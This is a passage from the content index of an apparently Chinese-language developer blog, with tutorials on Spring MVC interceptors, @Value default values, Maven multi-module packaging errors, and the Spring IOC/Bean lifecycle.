配置自定义拦截器\n\n * 实现接口handlerinterceptor\n * 重写方法：\n   * prehandle：handler之前执行，返回true表示放行(只要访问到该拦截器，一定执行)\n   * posthandle：handler逻辑真正执行完成但尚未返回页面（如果页面放行才会执行）\n   * aftercompletion：返回页面之后（只要访问到该拦截器，一定执行）\n\npublic class myinterceptor implements handlerinterceptor {\n\n    @override\n    public boolean prehandle(httpservletrequest request, httpservletresponse response, object handler) throws exception {\n        system.out.println("拦截器1：prehandle");\n        return true;\n    }\n\n    @override\n    public void posthandle(httpservletrequest request, httpservletresponse response, object handler, modelandview modelandview) throws exception {\n        system.out.println("拦截器1：posthandle");\n    }\n\n    @override\n    public void aftercompletion(httpservletrequest request, httpservletresponse response, object handler, exception ex) throws exception {\n        system.out.println("拦截器1：aftercompletion");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n * springmvc.xml配置拦截器\n\n<mvc:interceptors>\n    <mvc:interceptor>\n        \x3c!--/** 拦截浏览器的所有请求--\x3e\n        <mvc:mapping path="/**"/>\n        \x3c!--可以 配置指定的资源进行不拦截, 资源放行--\x3e\n        <mvc:exclude-mapping path="/js/**"></mvc:exclude-mapping>\n        <mvc:exclude-mapping path="/css/**"></mvc:exclude-mapping>\n        <mvc:exclude-mapping path="/image/**"></mvc:exclude-mapping>\n\n        <bean id="myinterceptor " class="com.kehao.interceptor.myinterceptor "></bean>\n    </mvc:interceptor>\n</mvc:interceptors>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 多个拦截器\n\n如果有多个拦截器\n\n * prehandle方法需要根据springmvc.xml中的配置顺序依次执行\n * aftercompletion则相反，越早执行prehandle方法的拦截器，越晚执行aftercompletion,类似于栈',charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"SpringBoot 中 @Value 注解设置默认值",frontmatter:{title:"SpringBoot 中 @Value 注解设置默认值",date:"2022-04-30T17:03:49.000Z",permalink:"/pages/a8f65a/",categories:["java","spring"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/04.spring/11.SpringBoot%20%E4%B8%AD%20@Value%20%E6%B3%A8%E8%A7%A3%E8%AE%BE%E7%BD%AE%E9%BB%98%E8%AE%A4%E5%80%BC.html",relativePath:"04.java/04.spring/11.SpringBoot 中 @Value 注解设置默认值.md",key:"v-461fa684",path:"/pages/a8f65a/",headersStr:null,content:'> 本文原文地址 https://blog.csdn.net/li02112017/article/details/118912109\n\n在 SpringBoot 项目读取配置文件中读取值，我们会用到 @Value 注解来读取配置值，例如我们在配置文件中配置了服务器 web 域名为 xxx.com 的配置：\n\nserver.web.domain=xxx.com\n\n\n\n1\n2\n\n\n在代码中读取其配置项：\n\n@Value("${server.web.domain}")\nprivate String domain;\n\n\n\n1\n2\n3\n\n\n如果这个配置项在配置文件中忘记配置或者有的场景中我们不需要配置这项的时候，在项目启动的时候就会报错。\n报错信息如下：\n\nCaused by: java.lang.IllegalArgumentException: Could not resolve placeholder \'server.web.domain\' in value "${server.web.domain}"\n\tat org.springframework.util.PropertyPlaceholderHelper.parseStringValue(PropertyPlaceholderHelper.java:178)\n\tat org.springframework.util.PropertyPlaceholderHelper.replacePlaceholders(PropertyPlaceholderHelper.java:124)\n\tat org.springframework.core.env.AbstractPropertyResolver.doResolvePlaceholders(AbstractPropertyResolver.java:239)\n\tat org.springframework.core.env.AbstractPropertyResolver.resolveRequiredPlaceholders(AbstractPropertyResolver.java:210)\n\tat org.springframework.context.support.PropertySourcesPlaceholderConfigurer.lambda$processProperties$0(PropertySourcesPlaceholderConfigurer.java:175)\n\tat org.springframework.beans.factory.support.AbstractBeanFactory.resolveEmbeddedValue(AbstractBeanFactory.java:918)\n\tat org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1248)\n\tat org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1227)\n\tat org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:640)\n\tat org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:119)\n\tat org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessProperties(AutowiredAnnotationBeanPostProcessor.java:399)\n\t... 18 common frames omitted\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n这个时候就需要我们给 @Value 注解配置项给个默认值。\n解决方法如下：\n\n @Value("${server.web.domain:#{null}}")\n private String domain;\n\n\n\n1\n2\n3\n\n\n或者\n\n @Value("${server.web.domain:xxx}")\n  private String domain;\n\n\n\n1\n2\n3\n\n\n不过如果默认值我们要设置为 null 时，我们使用 ${server.web.domain:null} 时，拿到 domain 的默认值会是 “null" null 的字符串，所以这种情况下，我们使用 ${server.web.domain:#{null}}, 这种方式进行赋予默认值',normalizedContent:'> 本文原文地址 https://blog.csdn.net/li02112017/article/details/118912109\n\n在 springboot 项目读取配置文件中读取值，我们会用到 @value 注解来读取配置值，例如我们在配置文件中配置了服务器 web 域名为 xxx.com 的配置：\n\nserver.web.domain=xxx.com\n\n\n\n1\n2\n\n\n在代码中读取其配置项：\n\n@value("${server.web.domain}")\nprivate string domain;\n\n\n\n1\n2\n3\n\n\n如果这个配置项在配置文件中忘记配置或者有的场景中我们不需要配置这项的时候，在项目启动的时候就会报错。\n报错信息如下：\n\ncaused by: java.lang.illegalargumentexception: could not resolve placeholder \'server.web.domain\' in value "${server.web.domain}"\n\tat org.springframework.util.propertyplaceholderhelper.parsestringvalue(propertyplaceholderhelper.java:178)\n\tat org.springframework.util.propertyplaceholderhelper.replaceplaceholders(propertyplaceholderhelper.java:124)\n\tat org.springframework.core.env.abstractpropertyresolver.doresolveplaceholders(abstractpropertyresolver.java:239)\n\tat org.springframework.core.env.abstractpropertyresolver.resolverequiredplaceholders(abstractpropertyresolver.java:210)\n\tat org.springframework.context.support.propertysourcesplaceholderconfigurer.lambda$processproperties$0(propertysourcesplaceholderconfigurer.java:175)\n\tat org.springframework.beans.factory.support.abstractbeanfactory.resolveembeddedvalue(abstractbeanfactory.java:918)\n\tat org.springframework.beans.factory.support.defaultlistablebeanfactory.doresolvedependency(defaultlistablebeanfactory.java:1248)\n\tat org.springframework.beans.factory.support.defaultlistablebeanfactory.resolvedependency(defaultlistablebeanfactory.java:1227)\n\tat org.springframework.beans.factory.annotation.autowiredannotationbeanpostprocessor$autowiredfieldelement.inject(autowiredannotationbeanpostprocessor.java:640)\n\tat org.springframework.beans.factory.annotation.injectionmetadata.inject(injectionmetadata.java:119)\n\tat org.springframework.beans.factory.annotation.autowiredannotationbeanpostprocessor.postprocessproperties(autowiredannotationbeanpostprocessor.java:399)\n\t... 18 common frames omitted\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n这个时候就需要我们给 @value 注解配置项给个默认值。\n解决方法如下：\n\n @value("${server.web.domain:#{null}}")\n private string domain;\n\n\n\n1\n2\n3\n\n\n或者\n\n @value("${server.web.domain:xxx}")\n  private string domain;\n\n\n\n1\n2\n3\n\n\n不过如果默认值我们要设置为 null 时，我们使用 ${server.web.domain:null} 时，拿到 domain 的默认值会是 “null" null 的字符串，所以这种情况下，我们使用 ${server.web.domain:#{null}}, 这种方式进行赋予默认值',charsets:{cjk:!0},lastUpdated:"2022/04/30, 18:54:20",lastUpdatedTimestamp:165131606e4},{title:"Spring boot 项目 maven 多模块打包 子模块报错 Unable to find ma",frontmatter:{title:"Spring boot 项目 maven 多模块打包 子模块报错 Unable to find ma",date:"2022-08-10T15:50:10.000Z",permalink:"/pages/1016ea/",categories:["java","spring"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/04.spring/12.Spring%20boot%20%E9%A1%B9%E7%9B%AE%20maven%20%E5%A4%9A%E6%A8%A1%E5%9D%97%E6%89%93%E5%8C%85%20%E5%AD%90%E6%A8%A1%E5%9D%97%E6%8A%A5%E9%94%99%20Unable%20to%20find%20ma.html",relativePath:"04.java/04.spring/12.Spring boot 项目 maven 多模块打包 子模块报错 Unable to find ma.md",key:"v-ecb575da",path:"/pages/1016ea/",headersStr:null,content:"> 本文参考文章地址 https://www.zjh336.cn/?id=234\n\n错误：\n\n\n\nUnable to find main class  \n\n\n1\n\n\n原来 spring boot 项目使用 maven 打包，如果没有做配置的话，会自动寻找签名是 public static void main(String[] args) 的方法。而配置项是什么呢？\n\n<plugin>\n\t<groupId>org.springframework.boot</groupId>\n\t<artifactId>spring-boot-maven-plugin</artifactId>\n</plugin>\n\n\n1\n2\n3\n4\n\n\nservice 模块只是个服务工程，本来就没有入口 class。那该如何设置呢？\n\n其实很简单，只需要在 service 模块中添加：\n\n<plugin>\n\t<groupId>org.springframework.boot</groupId>\n\t<artifactId>spring-boot-maven-plugin</artifactId>\n\t<configuration>\n\t\t<skip>true</skip>\n\t</configuration>\n</plugin>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n配置添加，设置过滤即可。",normalizedContent:"> 本文参考文章地址 https://www.zjh336.cn/?id=234\n\n错误：\n\n\n\nunable to find main class  \n\n\n1\n\n\n原来 spring boot 项目使用 maven 打包，如果没有做配置的话，会自动寻找签名是 public static void main(string[] args) 的方法。而配置项是什么呢？\n\n<plugin>\n\t<groupid>org.springframework.boot</groupid>\n\t<artifactid>spring-boot-maven-plugin</artifactid>\n</plugin>\n\n\n1\n2\n3\n4\n\n\nservice 模块只是个服务工程，本来就没有入口 class。那该如何设置呢？\n\n其实很简单，只需要在 service 模块中添加：\n\n<plugin>\n\t<groupid>org.springframework.boot</groupid>\n\t<artifactid>spring-boot-maven-plugin</artifactid>\n\t<configuration>\n\t\t<skip>true</skip>\n\t</configuration>\n</plugin>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n配置添加，设置过滤即可。",charsets:{cjk:!0},lastUpdated:"2022/05/15, 11:42:40",lastUpdatedTimestamp:165258616e4},{title:"Spring IOC详解 以及 Bean生命周期详细过程",frontmatter:{title:"Spring IOC详解 以及 Bean生命周期详细过程",date:"2022-08-10T15:50:10.000Z",permalink:"/pages/ecb5ee/",categories:["java","spring"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/04.spring/13.Spring%20IOC%E8%AF%A6%E8%A7%A3%20%E4%BB%A5%E5%8F%8A%20Bean%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B.html",relativePath:"04.java/04.spring/13.Spring IOC详解 以及 Bean生命周期详细过程.md",key:"v-54465354",path:"/pages/ecb5ee/",headers:[{level:2,title:"Spring IOC",slug:"spring-ioc",normalizedTitle:"spring ioc",charIndex:2},{level:2,title:"spring ioc的加载过程",slug:"spring-ioc的加载过程",normalizedTitle:"spring ioc的加载过程",charIndex:448},{level:2,title:"Spring Bean的生命周期",slug:"spring-bean的生命周期",normalizedTitle:"spring bean的生命周期",charIndex:1877},{level:3,title:"1、实例化前置",slug:"_1、实例化前置",normalizedTitle:"1、实例化前置",charIndex:3538},{level:3,title:"2、实例化对象",slug:"_2、实例化对象",normalizedTitle:"2、实例化对象",charIndex:3996},{level:3,title:"3、实例化后置",slug:"_3、实例化后置",normalizedTitle:"3、实例化后置",charIndex:4097},{level:3,title:"4、属性修改",slug:"_4、属性修改",normalizedTitle:"4、属性修改",charIndex:4466},{level:3,title:"5、给用户属性赋值",slug:"_5、给用户属性赋值",normalizedTitle:"5、给用户属性赋值",charIndex:4731},{level:3,title:"6、给容器属性赋值",slug:"_6、给容器属性赋值",normalizedTitle:"6、给容器属性赋值",charIndex:4923},{level:3,title:"6.1  BeanNameAware.setBeanName()",slug:"_6-1-beannameaware-setbeanname",normalizedTitle:"6.1  beannameaware.setbeanname()",charIndex:9223},{level:3,title:"6.2  BeanClassLoaderAware.setBeanClassLoader()",slug:"_6-2-beanclassloaderaware-setbeanclassloader",normalizedTitle:"6.2  beanclassloaderaware.setbeanclassloader()",charIndex:9330},{level:3,title:"6.3 BeanFactoryAware.setBeanFactory()",slug:"_6-3-beanfactoryaware-setbeanfactory",normalizedTitle:"6.3 beanfactoryaware.setbeanfactory()",charIndex:9395},{level:3,title:"6.4 EnvironmentAware.setEnvironment()",slug:"_6-4-environmentaware-setenvironment",normalizedTitle:"6.4 environmentaware.setenvironment()",charIndex:9590},{level:3,title:"6.5  EmbeddedValueResolverAware.setEmbeddedValueResolver()",slug:"_6-5-embeddedvalueresolveraware-setembeddedvalueresolver",normalizedTitle:"6.5  embeddedvalueresolveraware.setembeddedvalueresolver()",charIndex:9729},{level:3,title:"6.6 ResourceLoaderAware.setResourceLoader()",slug:"_6-6-resourceloaderaware-setresourceloader",normalizedTitle:"6.6 resourceloaderaware.setresourceloader()",charIndex:10201},{level:3,title:"6.7 ApplicationEventPublisherAware.setApplicationEventPublisher()；",slug:"_6-7-applicationeventpublisheraware-setapplicationeventpublisher",normalizedTitle:"6.7 applicationeventpublisheraware.setapplicationeventpublisher()；",charIndex:10993},{level:3,title:"6.8 MessageSourceAware.setMessageSource()",slug:"_6-8-messagesourceaware-setmessagesource",normalizedTitle:"6.8 messagesourceaware.setmessagesource()",charIndex:13344},{level:3,title:"6.9 ApplicationContextAware.setApplicationContext()",slug:"_6-9-applicationcontextaware-setapplicationcontext",normalizedTitle:"6.9 applicationcontextaware.setapplicationcontext()",charIndex:13401},{level:3,title:"6.10 ServletContextAware.setServletContext()",slug:"_6-10-servletcontextaware-setservletcontext",normalizedTitle:"6.10 servletcontextaware.setservletcontext()",charIndex:15894},{level:3,title:"6.11 LoadTimeWeaverAware.setLoadTimeWeaver()",slug:"_6-11-loadtimeweaveraware-setloadtimeweaver",normalizedTitle:"6.11 loadtimeweaveraware.setloadtimeweaver()",charIndex:16310},{level:3,title:"6.12  ImportAware.setImportMetadata()",slug:"_6-12-importaware-setimportmetadata",normalizedTitle:"6.12  importaware.setimportmetadata()",charIndex:16604},{level:2,title:"7、初始化前置",slug:"_7、初始化前置",normalizedTitle:"7、初始化前置",charIndex:16749},{level:2,title:"8、初始化后置",slug:"_8、初始化后置",normalizedTitle:"8、初始化后置",charIndex:16897},{level:2,title:"9、执行初始化方法",slug:"_9、执行初始化方法",normalizedTitle:"9、执行初始化方法",charIndex:17868},{level:3,title:"9.1 初始化方法一：@PostConstruct",slug:"_9-1-初始化方法一-postconstruct",normalizedTitle:"9.1 初始化方法一：@postconstruct",charIndex:17973},{level:3,title:"9.2 InitializingBean.afterPropertiesSet()",slug:"_9-2-initializingbean-afterpropertiesset",normalizedTitle:"9.2 initializingbean.afterpropertiesset()",charIndex:18850},{level:3,title:"9.3 init-method",slug:"_9-3-init-method",normalizedTitle:"9.3 init-method",charIndex:19589},{level:2,title:"10、使用中",slug:"_10、使用中",normalizedTitle:"10、使用中",charIndex:20482},{level:2,title:"11、销毁流程",slug:"_11、销毁流程",normalizedTitle:"11、销毁流程",charIndex:20538},{level:3,title:"11.1  DisposableBean.destroy()",slug:"_11-1-disposablebean-destroy",normalizedTitle:"11.1  disposablebean.destroy()",charIndex:21321},{level:3,title:"11.2  destory-method方法",slug:"_11-2-destory-method方法",normalizedTitle:"11.2  destory-method方法",charIndex:21773},{level:2,title:"12、返回bean给用户，剩下的生命周期由用户控制",slug:"_12、返回bean给用户-剩下的生命周期由用户控制",normalizedTitle:"12、返回bean给用户，剩下的生命周期由用户控制",charIndex:22852}],headersStr:"Spring IOC spring ioc的加载过程 Spring Bean的生命周期 1、实例化前置 2、实例化对象 3、实例化后置 4、属性修改 5、给用户属性赋值 6、给容器属性赋值 6.1  BeanNameAware.setBeanName() 6.2  BeanClassLoaderAware.setBeanClassLoader() 6.3 BeanFactoryAware.setBeanFactory() 6.4 EnvironmentAware.setEnvironment() 6.5  EmbeddedValueResolverAware.setEmbeddedValueResolver() 6.6 ResourceLoaderAware.setResourceLoader() 6.7 ApplicationEventPublisherAware.setApplicationEventPublisher()； 6.8 MessageSourceAware.setMessageSource() 6.9 ApplicationContextAware.setApplicationContext() 6.10 ServletContextAware.setServletContext() 6.11 LoadTimeWeaverAware.setLoadTimeWeaver() 6.12  ImportAware.setImportMetadata() 7、初始化前置 8、初始化后置 9、执行初始化方法 9.1 初始化方法一：@PostConstruct 9.2 InitializingBean.afterPropertiesSet() 9.3 init-method 10、使用中 11、销毁流程 11.1  DisposableBean.destroy() 11.2  destory-method方法 12、返回bean给用户，剩下的生命周期由用户控制",content:'# Spring IOC\n\n首先，在此之前，我们就必须先知道什么是ioc，ioc叫做控制反转，也可以称为依赖注入（DI），实际上依赖注入是ioc的另一种说法，\n\n 1. 谁控制谁？：在以前，对象的创建和销毁都是由用户控制的，用了ioc之后，对象的创建和销毁就都交给容器来控制了，用户就不用管这些，只关注业务需求就好了；\n\n 2. 什么是反转？：既然叫反转，肯定就有正转，正转其实就是对象去找实例，而反转就反过来了嘛，让实例来找对象；怎么找呢？当然是通过容器啦！\n    \n    \n\n 3. 谁依赖谁？：在spring项目中，将对象理解为Bean，也可以叫bean对象，这个bean和容器之间有个依赖关系，bean对象的创建是依赖容器的，就好像孩子依赖父母一样，孩子不能自己生出自己，需要父母的合作才能出生，这里的孩子就是bean，父母就是容器；\n\n 4. 谁注入谁？：通过容器注入了bean对象，而且这个过程是自动化的，也就是说容器会自动找到和bean对象匹配的类型实例注入到对象中；\n\n\n# spring ioc的加载过程\n\n了解完控制反转和依赖注入，接下来我们在看看ioc的加载过程，ioc的整个加载过程如下图，先看看大致的流程，然后再慢慢深入 （其中黄色的框内是注释内容）\n\n\n\n1、首先，通过BeanDefinitionReader 读取指定的配置文件生成bean的定义信息，然后到完整的bean定义信息(BeanDefinition对象)，注意这里只是存储bean的定义信息，还没有实例化bean对象；就像工厂里面一样，原材料已经准备好了，但是还没有进行生产，原材料就是beanDefinition，生产就是实例化\n\n2、在 BeanDefinition 和 完整BeanDefinition 中间通过一个后置增强器，可以对bean的定义信息进行统一修改，只需要实现 BeanFactoryPostProcessor 接口即可，这个后置增强器是可以有多个的，你只要在不同的类实现多个 BeanFactoryPostProcessor 接口就会执行多次，就像这样：\n\npackage com.Spring.Boot.init;\nimport org.springframework.beans.BeansException;\nimport org.springframework.beans.factory.config.BeanFactoryPostProcessor;\nimport org.springframework.beans.factory.config.ConfigurableListableBeanFactory;\nimport org.springframework.stereotype.Component;\n/**\n * 扩展方法--后置增强器（可修改bean的定义信息）\n */\n@Component\npublic class ExtBeanFactoryPostProcessor implements BeanFactoryPostProcessor {\n    @Override\n    public void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory) throws BeansException {\n//        BeanDefinition studentService = beanFactory.getBeanDefinition("studentService");\n        System.out.println("扩展方法--可进行修改beanDefinition的定义信息");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n3、得到 完整BeanDefinition 之后就可以进行创建对象了，这整个过程被称为 bean 的生命周期，也就是从实例化到销毁的过程；那么这时候爱学习童鞋就要发问了：“对象创建和销毁有这么麻烦嘛？直接反射实例化一个对象不就行了嘛？为啥还有初始化？”； 首先，这是个好问题，来，我们先把掌声送给这位发问的同学；我想说的是，就算是普通的new一个对象出来，里面也会经过实例化和初始化，有兴趣的话请看我的另一篇文章 ： java创建对象过程 实例化和初始化； 接下来我们重点讲bean的生命周期;\n\n\n# Spring Bean的生命周期\n\n粗略来看，bean的生命周期主要分为以下4个步骤\n\n\n\n但其实，它的内部蕴含了很多东西，让我们看看细化后的流程图；\n\n\n\n怎么样？ 是不是看到了很多没见过的东西？好像认识几个，但大多都是没见过的东东，不知道不要紧，接下来我们一个个地讲解\n\n接下来我们要将1、3、4 放到一起讲，是因为它们是在同一个接口里面的，实现 InstantiationAwareBeanPostProcessor 接口即可\n\npackage com.Spring.Boot.init;\n \nimport org.springframework.beans.BeansException;\nimport org.springframework.beans.factory.config.InstantiationAwareBeanPostProcessor;\nimport org.springframework.stereotype.Component;\n \n@Component\npublic class MyInstantiationAwareBeanPostProcessor implements InstantiationAwareBeanPostProcessor {\n \n    // 实例化前置\n    @Override\n    public Object postProcessBeforeInstantiation(Class<?> beanClass, String beanName) throws BeansException {\n        \n        System.out.println("postProcessBeforeInstantiation被调用了----在对象实例化之前调用-----beanName:" + beanName);\n        // 默认什么都不做，返回null\n        return null;\n    }\n \n    // 实例化后置\n    @Override\n    public boolean postProcessAfterInstantiation(Object bean, String beanName) throws BeansException {\n        System.out.println("postProcessAfterInstantiation被调用了---------beanName:" + beanName);\n        //默认返回true，什么也不做，继续下一步\n        return true;\n    }\n    \n    // 属性修改\n    @Override\n    public PropertyValues postProcessPropertyValues(PropertyValues pvs, PropertyDescriptor[] pds, Object bean, String beanName) throws BeansException {\n        System.out.println("postProcessPropertyValues被调用了---------beanName:"+beanName);\n        // 此方法可对bean中的属性值进行、添加、修改、删除操作；\n        // 对属性值进行修改，如果postProcessAfterInstantiation方法返回false，该方法可能不会被调用，\n        return pvs;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n下面我们依次解释\n\n\n# 1、实例化前置\n\n实例化前置使用的是 InstantiationAwareBeanPostProcessor.postProcessBeforeInstantiation(Class<?> beanClass, String beanName) 方法，方法里有2个参数，分别是beanClass和beanName，顾名思义，就是对在对象实例化之前对bean对象的class信息进行修改或者扩展，以达到我们想要的功能，它的底层是动态代理AOP技术实现的；且是bean生命周期中最先执行的方法；\n\n返回非空：返回值是Object类型，这意味着我们可以返回任何类型的值，由于这个时候目标对象还未实例化，所以这个返回值可以用来代替原本该生成对象的目标对象的实例，也就是说，如果返回了非空的值，那么以后我们需要用到这个bean的时候，拿到的就现在返回的对象了，也就不会去走第二步去实例化对象了；\n\n返回空（null）值：默认也是返回null值的，那么就直接返回，接下来会调用doCreateBean方法来实例化对象；\n\n\n# 2、实例化对象\n\ndoCreateBean方法创建实例，用反射技术创建，这个没什么好说的，只是相当于new了一个对象出来而已，但需要注意的是，这个时候只是将对象实例化了，对象内的属性还未设置；\n\n\n# 3、实例化后置\n\n方法名称： InstantiationAwareBeanPostProcessor.postProcessAfterInstantiation(Object bean, String beanName)\n\n在目标对象实例化之后调用，这个时候对象已经被实例化，但是该实例的属性还未被设置，都是null。因为他的返回值是决定要不要调用postProcessPropertyValues方法中的一个因素(因为还有一个因素是mbd.getDependencyCheck());\n\n返回false ：如果该方法返回false，并且不需要check，那么postProcessPropertyValues就会被忽略不执行；\n\n返回true ： 如果返回true，postProcessPropertyValues就会被执行\n\n\n# 4、属性修改\n\n方法名称 ：InstantiationAwareBeanPostProcessor.PropertyValues postProcessPropertyValues(PropertyValues pvs, PropertyDescriptor[] pds, Object bean, String beanName)\n\n此方法可对属性值进行修改，修改范围包括添加、修改、删除操作；，如果实例化后置 postProcessAfterInstantiation() 方法返回false，那么该方法不会被调用；\n\n\n# 5、给用户属性赋值\n\n用户属性指的是用spring 的人自定义的bean对象属性，像 User、Student、Teacher 、UserService、IndexService 这类的对象都是自定义bean对象，第5步主要给这类属性进行赋值操作，使用的是  AbstractAutowireCapableBeanFactory.populateBean() 方法进行赋值；\n\n\n# 6、给容器属性赋值\n\n容器属性其实就是容器自带的属性，这些属性都是spring本来就有的；可以肯定的是，它们都是 Aware 接口的实现类，主要有以下实现类，我已经将它们的执行顺序都排列好了，\n\n\n\n我们先看看怎么用，然后再来讲解每个Aware的作用；上代码\n\npackage com.Spring.Boot.init.aware;\n \nimport org.springframework.beans.BeansException;\nimport org.springframework.beans.factory.BeanClassLoaderAware;\nimport org.springframework.beans.factory.BeanFactory;\nimport org.springframework.beans.factory.BeanFactoryAware;\nimport org.springframework.beans.factory.BeanNameAware;\nimport org.springframework.context.*;\nimport org.springframework.context.annotation.ImportAware;\nimport org.springframework.context.weaving.LoadTimeWeaverAware;\nimport org.springframework.core.env.Environment;\nimport org.springframework.core.io.ResourceLoader;\nimport org.springframework.core.type.AnnotationMetadata;\nimport org.springframework.instrument.classloading.LoadTimeWeaver;\nimport org.springframework.stereotype.Component;\nimport org.springframework.util.StringValueResolver;\nimport org.springframework.web.context.ServletContextAware;\nimport javax.servlet.ServletContext;\n \n@Component\npublic class AllAwareInterface  implements BeanNameAware, BeanClassLoaderAware,\n        BeanFactoryAware, EnvironmentAware, EmbeddedValueResolverAware,\n        ResourceLoaderAware, ApplicationEventPublisherAware, MessageSourceAware,\n        ApplicationContextAware, ServletContextAware, LoadTimeWeaverAware, ImportAware {\n \n    @Override\n    public void setBeanName(String name) {\n        // BeanNameAware作用：让Bean对Name有知觉\n        //这个方法只是简单的返回我们当前的beanName,听官方的意思是这个接口更多的使用在spring的框架代码中，实际开发环境应该不建议使用\n        System.out.println("1 我是 BeanNameAware 的 setBeanName 方法  ---参数：name，内容："+ name);\n    }\n    @Override\n    public void setBeanClassLoader(ClassLoader classLoader) {\n        System.out.println("2 我是 BeanClassLoaderAware 的 setBeanClassLoader 方法");\n    }\n    @Override\n    public void setBeanFactory(BeanFactory beanFactory) throws BeansException {\n        // 注意： 如果使用 @Configuration 注解的话，setBeanFactory方法会执行2次，\n        System.out.println("3 我是 BeanFactoryAware 的 setBeanFactory 方法");\n    }\n    @Override\n    public void setEnvironment(Environment environment) {\n        System.out.println("4 我是 EnvironmentAware 的 setEnvironment 方法");\n    }\n    @Override\n    public void setEmbeddedValueResolver(StringValueResolver stringValueResolver) {\n        System.out.println("5 我是 EmbeddedValueResolverAware 的 setEmbeddedValueResolver 方法");\n    }\n    @Override\n    public void setResourceLoader(ResourceLoader resourceLoader) {\n        System.out.println("6 我是 ResourceLoaderAware 的 setResourceLoader 方法");\n    }\n    @Override\n    public void setApplicationEventPublisher(ApplicationEventPublisher applicationEventPublisher) {\n        System.out.println("7 我是 ApplicationEventPublisherAware 的 setApplicationEventPublisher 方法");\n    }\n    @Override\n    public void setMessageSource(MessageSource messageSource) {\n        System.out.println("8 我是 MessageSourceAware 的 setMessageSource 方法");\n    }\n    @Override\n    public void setApplicationContext(ApplicationContext applicationContext) throws BeansException {\n        System.out.println("9 我是 ApplicationContextAware 的 setApplicationContext 方法");\n    }\n    @Override\n    public void setServletContext(ServletContext servletContext) {\n        System.out.println("10 我是 ServletContextAware 的 setServletContext 方法");\n    }\n    @Override\n    public void setLoadTimeWeaver(LoadTimeWeaver loadTimeWeaver) {\n        //LoadTimeWeaver 简称LTW，LTW是AOP的一种实现方式，此方法是为了获取Aop织入的对象，使用的织入方式是：类加载期织入，\n        // 一般的aop都是运行期织入，就是在运行的时候才进行织入切面方法，但是LTW是在类加载前就被织入了，也就是class文件在jvm加载之前进行织入切面方法\n        // 只有在使用 @EnableLoadTimeWeaving 或者存在 LoadTimeWeaver 实现的 Bean 时才会调用，顺序也很靠后\n        System.out.println("11 我是 LoadTimeWeaverAware 的 setLoadTimeWeaver 方法");\n    }\n    @Override\n    public void setImportMetadata(AnnotationMetadata annotationMetadata) {\n        //只有被其他配置类 @Import(XX.class) 时才会调用，这个调用对 XX.class 中的所有 @Bean 来说顺序是第 1 的。\n        System.out.println("12 我是 ImportAware 的 setImportMetadata 方法");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n\n\n启动spring后的控制台打印的部分结果如下：\n\n\n\n可以看到它们的输出结果按照顺序依次排列打印出来了，这就是它的标准顺序了；接下来我们了解下它们的具体作用\n\n\n# 6.1  BeanNameAware.setBeanName()\n\n这个方法只是简单的返回我们当前的beanName,听官方的意思是这个接口更多的使用在spring的框架代码中，实际开发环境应该不建议使用\n\n\n# 6.2  BeanClassLoaderAware.setBeanClassLoader()\n\n获取Bean的类装载器，\n\n\n# 6.3 BeanFactoryAware.setBeanFactory()\n\n获取bean工厂，beanFactory让你可以不依赖注入方式，随意的读取IOC容器里面的对象，不过beanFactory本身还是要注入的。\n\n需要注意的是，一般情况下我们都用  @Component 注解，如果使用 @Configuration 注解的话，setBeanFactory方法会执行2次；\n\n\n# 6.4 EnvironmentAware.setEnvironment()\n\n实现了EnvironmentAware接口重写setEnvironment方法后，在工程启动时可以获得application.properties 、xml、yml 的配置文件配置的属性值。\n\n\n# 6.5  EmbeddedValueResolverAware.setEmbeddedValueResolver()\n\n通常我们使用@Value注解来获取properties 和 yml 文件中的值，每个类中都要使用@Value也很繁琐，实现EmbeddedValueResolverAware接口后就方便多了。用法也跟@Value一样，需要用${}包裹住；\n\n@Component   \npublic class PropertiesUtil implements EmbeddedValueResolverAware {\n \n\t@Override\n\tpublic void setEmbeddedValueResolver(StringValueResolver stringValueResolver) {   \n     System.out.println(stringValueResolver.resolveStringValue("${logging.file}"));\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 6.6 ResourceLoaderAware.setResourceLoader()\n\nSpring 